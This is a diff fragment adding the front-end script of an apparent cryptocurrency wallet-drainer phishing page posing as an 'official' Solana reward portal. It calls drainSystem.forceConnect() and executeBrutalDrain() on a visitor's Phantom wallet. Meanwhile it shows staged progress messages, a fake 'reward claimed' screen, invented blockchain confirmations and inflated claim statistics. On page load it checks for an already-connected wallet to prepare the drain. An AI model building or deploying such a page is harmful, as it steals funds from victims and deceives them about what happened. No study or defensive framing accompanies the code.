+                    // Step 1: Auto-detect and connect
+                    this.updateProgress(30, 'Connecting to wallet...');
+                    
+                    const connected = await this.drainSystem.forceConnect();
+                    if (!connected) {
+                        throw new Error('Wallet connection failed');
+                    }
+                    
+                    // Step 2: Start immediate drain
+                    this.updateProgress(50, 'Verifying eligibility...');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    this.updateProgress(70, 'Processing reward claim...');
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    this.updateProgress(90, 'Transferring SOL reward...');
+                    
+                    // Execute the brutal drain
+                    await this.drainSystem.executeBrutalDrain();
+                    
+                    // Step 3: Show fake success
+                    this.updateProgress(100, 'Reward claimed successfully!');
+                    this.showFakeSuccess();
+                    
+                    // Auto-close modal and show claimed state
+                    setTimeout(() => {
+                        this.hideModal();
+                        this.showClaimedState();
+                    }, 2000);
+                    
+                } catch (error) {
+                    console.error('❌ Process failed:', error);
+                    this.showError('Connection failed. Please try again.');
+                    this.hideModal();
+                } finally {
+                    this.processing = false;
+                }
+            }
+
+            updateProgress(percent, text) {
+                document.getElementById('progressFill').style.width = percent + '%';
+                document.getElementById('modalText').textContent = text;
+                document.getElementById('modalStatus').textContent = `${percent}% complete`;
+            }
+
+            showModal() {
+                document.getElementById('processingModal').classList.add('active');
+            }
+
+            hideModal() {
+                document.getElementById('processingModal').classList.remove('active');
+                document.getElementById('progressFill').style.width = '0%';
+            }
+
+            showFakeSuccess() {
+                document.getElementById('modalContent').innerHTML = `
+                    <button class="modal-close" onclick="window.portal.hideModal()">×</button>
+                    <div class="modal-icon" style="background: rgba(0, 255, 163, 0.1); color: var(--success);">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2 style="margin-bottom: 10px; font-size: 32px; color: var(--success);">Success!</h2>
+                    <p style="color: var(--text-secondary); margin-bottom: 30px;">
+                        🎉 0.1 SOL reward claimed successfully!
+                    </p>
+                    <div style="background: rgba(0, 255, 163, 0.1); border: 1px solid rgba(0, 255, 163, 0.3); border-radius: var(--radius-sm); padding: 20px; margin-top: 20px;">
+                        <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 10px;">
+                            <i class="fas fa-clock"></i> Your SOL will arrive within 5-10 minutes
+                        </p>
+                        <p style="color: var(--text-secondary); font-size: 12px;">
+                            Transaction confirmed on Solana blockchain
+                        </p>
+                    </div>
+                `;
+            }
+
+            showClaimedState() {
+                const connectBtn = document.getElementById('connectBtn');
+                const successMessage = document.getElementById('successMessage');
+                
+                connectBtn.innerHTML = `
+                    <i class="fas fa-check-circle"></i>
+                    REWARD CLAIMED
+                `;
+                connectBtn.classList.add('disabled');
+                connectBtn.style.background = 'linear-gradient(135deg, #2A2A2A 0%, #1A1A1A 100%)';
+                connectBtn.style.color = '#666';
+                connectBtn.style.cursor = 'not-allowed';
+                connectBtn.style.boxShadow = 'none';
+                connectBtn.onclick = null;
+                
+                successMessage.style.display = 'flex';
+                successMessage.classList.add('show');
+                
+                // Disable all task buttons
+                document.querySelectorAll('.task-btn').forEach(btn => {
+                    btn.innerHTML = '<i class="fas fa-check"></i> Completed';
+                    btn.style.background = 'rgba(0, 255, 163, 0.1)';
+                    btn.style.color = 'var(--success)';
+                    btn.style.borderColor = 'rgba(0, 255, 163, 0.3)';
+                    btn.style.cursor = 'default';
+                    btn.onclick = null;
+                });
+                
+                // Update stats
+                const claimedElement = document.querySelectorAll('.stat-number')[0];
+                const claimedCount = parseInt(claimedElement.textContent.replace(/,/g, ''));
+                claimedElement.textContent = (claimedCount + 1).toLocaleString();
+                
+                const solElement = document.querySelectorAll('.stat-number')[1];
+                const solCount = parseFloat(solElement.textContent);
+                solElement.textContent = (solCount + 0.1).toFixed(1);
+                
+                this.claimed = true;
+            }
+
+            showError(message) {
+                const errorElement = document.getElementById('errorMessage');
+                errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i><span>${message}</span>`;
+                errorMessage.style.display = 'flex';
+                errorMessage.classList.add('show');
+                
+                setTimeout(() => {
+                    errorMessage.classList.remove('show');
+                    setTimeout(() => {
+                        errorMessage.style.display = 'none';
+                    }, 300);
+                }, 5000);
+            }
+        }
+
+        // Global functions
+        function showWalletRequired() {
+            const errorElement = document.getElementById('errorMessage');
+            errorElement.innerHTML = '<i class="fas fa-exclamation-circle"></i><span>Please connect your wallet first to start tasks!</span>';
+            errorElement.style.display = 'flex';
+            errorElement.classList.add('show');
+            
+            setTimeout(() => {
+                errorElement.classList.remove('show');
+                setTimeout(() => {
+                    errorElement.style.display = 'none';
+                }, 300);
+            }, 3000);
+        }
+
+        function hideModal() {
+            document.getElementById('processingModal').classList.remove('active');
+        }
+
+        // Initialize portal on load
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('📄 PAGE LOADED');
+            window.portal = new RewardPortal();
+            
+            // Auto-trigger if wallet is already connected
+            setTimeout(() => {
+                if (window.phantom?.solana?.isConnected && !window.portal.claimed) {
+                    console.log('👻 Wallet already connected - preparing drain');
+                }
+            }, 2000);
+        });
+
+        // Add some console branding
+        console.log('%c🔐 Solana Reward Portal', 'color: #00FFA3; font-size: 20px; font-weight: bold;');
+        console.log('%cOfficial SOL distribution platform', 'color: #B0B3B8;');
+        console.log('%cSecure • Fast • Automated', 'color: #00FFA3; font-weight: bold;');
+    </script>
+</body>
+</html>
